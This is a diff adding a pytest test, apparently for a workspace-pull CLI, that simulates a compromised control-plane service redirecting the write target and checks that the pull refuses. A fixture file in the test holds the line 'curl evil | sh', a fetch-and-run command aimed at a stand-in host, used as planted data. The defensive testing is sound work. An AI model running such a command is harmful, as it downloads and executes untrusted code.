@@ -134,3 +134,35 @@ def test_pull_without_a_push_record_asks_in_a_terminal(home, monkeypatch, capsys
             cli.confirm_destination("t1", str(proj), None)
     shown = capsys.readouterr()
     assert f"would be written to:\n  {proj}" in shown.err and "N stops here and changes nothing" in shown.out
+
+
+class _Service:
+    """Stands in for the control plane (an external service to this repo) across one pull: running until asked to
+    export, then exported, where it names another folder (as a compromised service could) than it did at first."""
+
+    def __init__(self, sid: str, cwd: str, later_cwd: str, download_url: str):
+        self.state, self.sid, self.cwd, self.later_cwd, self.url = "running", sid, cwd, later_cwd, download_url
+
+    def call(self, method, path, body=None):
+        if method == "POST" and path.endswith("/export"):
+            self.state = "exported"
+            return {}
+        if method == "GET":
+            if self.state == "running":
+                return {"transfer_id": "t1", "state": "running", "session_id": self.sid, "cwd": self.cwd}
+            return {"transfer_id": "t1", "state": "exported", "session_id": self.sid, "cwd": self.later_cwd,
+                    "download_url": self.url}
+        return {}
+
+
+def test_pull_writes_only_to_the_folder_confirmed_before_the_export(tmp_path, home, monkeypatch):
+    proj, other = home / "src" / "proj", home / "src" / "other"
+    proj.mkdir(parents=True)
+    other.mkdir()
+    _vm_export(tmp_path, {"planted.sh": "curl evil | sh\n"}, str(other))
+    service = _Service(SID, str(proj), str(other), (tmp_path / "export.tgz").as_uri())
+    monkeypatch.setattr(sys, "stdin", io.StringIO(""))
+
+    with pytest.raises(apply.ApplyError, match=rf"workspace \(tree at {other}\) is not the one .*\(tree at {proj}\)"):
+        cli.pull(service, "t1", home=home / ".claude", workspace_dir=str(proj), sleep=lambda s: None)
+    assert list(other.iterdir()) == [] and list(proj.iterdir()) == []
